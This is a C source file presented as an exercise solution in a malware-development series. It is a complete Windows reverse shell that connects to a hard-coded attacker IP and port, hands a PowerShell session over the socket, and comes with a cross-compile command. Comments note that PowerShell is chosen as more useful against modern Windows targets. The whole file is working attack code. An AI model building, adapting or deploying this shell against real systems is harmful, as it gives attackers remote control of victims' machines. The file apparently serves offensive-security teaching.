/*
 * exercise 1 solution
 * malware development using WINAPI
 * hack1.c
 * reverse shell using powershell.exe instead of cmd.exe
 * author: @cocomelonc
 *
 * change: replaced "cmd.exe" with "powershell.exe" in the
 * CreateProcess call to spawn a PowerShell session instead
 * of a classic Command Prompt - more useful on modern Windows
 * targets since PowerShell offers richer scripting capabilities.
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-g++ hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lws2_32
 */
#include <winsock2.h>
#include <stdio.h>

WSADATA socketData;
SOCKET sock;
struct sockaddr_in addr;
STARTUPINFO si;
PROCESS_INFORMATION pi;

int main(int argc, char* argv[]) {
  // IP and port details for the attacker's machine
  char *attackerIP = "10.10.10.1";
  short attackerPort = 4445;

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData);

  // create socket object
  sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
                   (unsigned int)NULL, (unsigned int)NULL);

  addr.sin_family = AF_INET;
  addr.sin_port   = htons(attackerPort);
  addr.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);

  memset(&si, 0, sizeof(si));
  si.cb       = sizeof(si);
  si.dwFlags  = STARTF_USESTDHANDLES;
  si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) sock;

  /*
   * exercise 1 change:
   * original: CreateProcess(NULL, "cmd.exe", ...)
   * updated:  CreateProcess(NULL, "powershell.exe", ...)
   *
   * powershell.exe is found via PATH, so no full path is needed.
   * On modern Windows it resolves to Windows PowerShell 5.x.
   * For PowerShell 7+ (pwsh) use "pwsh.exe" instead.
   */
  CreateProcess(NULL, "powershell.exe", NULL, NULL, TRUE, 0,
                NULL, NULL, &si, &pi);
  exit(0);
}
